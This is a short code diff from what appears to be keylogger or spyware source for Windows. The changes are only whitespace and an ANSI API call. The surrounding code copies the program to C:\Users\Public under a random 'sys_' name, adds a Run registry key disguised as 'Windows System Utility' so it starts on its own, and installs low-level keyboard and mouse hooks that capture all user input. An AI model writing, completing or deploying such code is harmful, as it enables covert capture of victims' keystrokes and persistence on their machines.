@@ -6,8 +6,8 @@ int WINAPI WinMain(	HINSTANCE hInstance,	// handle to current instance
 					int nCmdShow 	// show state of window 
 					)						  				  
 {
-	char this_file_path[STR_SIZE];
-	GetModuleFileName(NULL, this_file_path, STR_SIZE);
+    char this_file_path[STR_SIZE];
+    GetModuleFileNameA(NULL, this_file_path, STR_SIZE);
 //*
 	char dst_file_path[STR_SIZE];
 	sprintf(dst_file_path, "C:\\Users\\Public\\sys_%d.exe", _random());
@@ -15,11 +15,11 @@ int WINAPI WinMain(	HINSTANCE hInstance,	// handle to current instance
 	
 	bool set_reg = set_registry_key( HKEY_CURRENT_USER, 
 					"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-					"Windows System Utility", 
+                    "Windows System Utility",
 					dst_file_path );
 //*/
 	SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)&keyoard_hook, hInstance, 0);
-	SetWindowsHookExA(WH_MOUSE_LL, (HOOKPROC)&mouse_hook, hInstance, 0);
+    SetWindowsHookExA(WH_MOUSE_LL, (HOOKPROC)&mouse_hook, hInstance, 0);
 
 	MSG msg = {0};
 
